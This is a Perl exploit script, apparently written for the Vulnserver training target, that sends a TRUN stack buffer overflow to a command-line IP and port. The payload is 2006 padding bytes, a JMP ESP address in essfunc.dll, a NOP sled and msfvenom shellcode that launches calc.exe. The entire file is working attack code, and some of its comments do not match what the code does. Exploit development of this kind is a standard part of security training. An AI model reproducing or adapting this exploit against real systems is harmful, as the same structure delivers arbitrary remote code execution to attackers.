#!/usr/bin/perl
use IO::Socket;

if ($ARGV[1] eq '') {
	die("Usage: $0 IP_ADDRESS PORT\n\n");
}


$baddata = "TRUN ."; 					# sets variable $baddata to "TRUN /.:/"
$baddata .= "\x41" x2006; 				# appends 2006 As to $baddata
$baddata .= pack('V', 0x625011AF);			# essfunc.dll JMP ESP 
$shellcode = "\x90" x 50;				# extends $baddata with Cs
$shellcode .= $shellcode .				# msfvenom -p windows/exec CMD=calc.exe -b "x00\x0A\x0D" -f perl EXITFUNC=process
"\x31\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76" .
"\x0e\x08\x24\xfc\x40\x83\xee\xfc\xe2\xf4\xf4\xcc\x7e\x40" .
"\x08\x24\x9c\xc9\xed\x15\x3c\x24\x83\x74\xcc\xcb\x5a\x28" .
"\x77\x12\x1c\xaf\x8e\x68\x07\x93\xb6\x66\x39\xdb\x50\x7c" .
"\x69\x58\xfe\x6c\x28\xe5\x33\x4d\x09\xe3\x1e\xb2\x5a\x73" .
"\x77\x12\x18\xaf\xb6\x7c\x83\x68\xed\x38\xeb\x6c\xfd\x91" .
"\x59\xaf\xa5\x60\x09\xf7\x77\x09\x10\xc7\xc6\x09\x83\x10" .
"\x77\x41\xde\x15\x03\xec\xc9\xeb\xf1\x41\xcf\x1c\x1c\x35" .
"\xfe\x27\x81\xb8\x33\x59\xd8\x35\xec\x7c\x77\x18\x2c\x25" .
"\x2f\x26\x83\x28\xb7\xcb\x50\x38\xfd\x93\x83\x20\x77\x41" .
"\xd8\xad\xb8\x64\x2c\x7f\xa7\x21\x51\x7e\xad\xbf\xe8\x7b" .
"\xa3\x1a\x83\x36\x17\xcd\x55\x4e\xfd\xcd\x8d\x96\xfc\x40" .
"\x08\x74\x94\x71\x83\x4b\x7b\xbf\xdd\x9f\x0c\xf5\xaa\x72" .
"\x94\xe6\x9d\x99\x61\xbf\xdd\x18\xfa\x3c\x02\xa4\x07\xa0" .
"\x7d\x21\x47\x07\x1b\x56\x93\x2a\x08\x77\x03\x95\x6b\x45" .
"\x90\x23\x26\x41\x84\x25\x08\x24\xfc\x40";

$socket = IO::Socket::INET->new( 			# setup TCP socket – $socket
	Proto => "tcp",
	PeerAddr => "$ARGV[0]", 			# command line variable 1 – IP Address
	PeerPort => "$ARGV[1]" 				# command line variable 2 – TCP port
	) or die "Cannot connect to $ARGV[0]:$ARGV[1]";
$socket->recv($sd, 1024); 				# Receive 1024 bytes data from $socket, store in $sd
print "$sd"; 						# print $sd variable
$socket->send($baddata.$shellcode); 			# send $baddata variable via $socket
